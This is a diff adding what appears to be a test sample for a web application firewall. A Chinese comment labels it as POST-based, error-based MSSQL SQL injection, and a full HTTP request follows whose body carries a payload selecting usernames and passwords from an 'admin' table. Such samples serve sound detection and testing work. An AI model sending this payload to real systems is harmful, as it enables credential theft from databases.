@@ -1,0 +1,10 @@
+# SQL注入_POST_mssql_报错注入
+# 攻击者基于报错查询通过POST方式，将"(select username,password from admin for xml path)>1"语句注入到 SQL 查询参数中，目的是获取表中所有数据。
+POST /?bid=hd_tag_m8mv256r HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv256r
+RM-PRO-Token: a2ccb2e960c355782d7ba97f65446ca4
+RM-PRO-Time: 1742808446038
+User-Agent: curl/7.83.1
+
+id=1 and (select username,password from admin for xml path)>1
